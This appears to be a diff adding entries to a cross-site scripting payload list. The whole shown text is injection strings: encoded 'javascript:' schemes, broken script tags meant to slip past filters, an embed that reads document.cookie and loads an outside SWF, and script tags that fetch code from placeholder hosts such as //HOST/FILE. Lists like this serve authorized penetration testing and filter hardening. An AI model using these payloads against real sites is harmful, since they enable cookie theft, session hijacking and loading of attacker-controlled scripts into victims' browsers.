@@ -4,9 +4,22 @@
 <link href=javascript:alert(1) accesskey=k>
 <iframe src="javascript:alert(1)%%0D3C--
 <link rel=import href='.&#47"><svg%20onload=alert(domain)>'>
+<embed /: script allowscriptaccess = always src = javascript:alert(document.cookie); http://l0.cm/xss.swf>
 </script><svg><script>alert(1)%0A-->
 ["</script><script>alert(1)</script>"]=123
 <script src=//3334957647/1>
+javascript&#58alert(document.domain)
+javascript&#x3ax=1;alert(document.domain)
+<embed src="javascript%26%63%6f%6c%6f%6e%3balert()">
+http://top.open`javas\cript:al\ert(1)`
+<script>alert(1)//
+<script>alert(1)<!--
+<script>alert(1)%0A-->
+<script src=data:,alert(1)>
+<script src=//HOST/FILE>
+<script src=https:DOMAIN/FILE>
+<svg><script xlink:href=//HOST/FILE>
+<svg><script xlink:href=https:DOMAIN/FILE>
 {alert`1`}
 (except <script>)
 "><input/onauxclick="[1].map(prompt)">
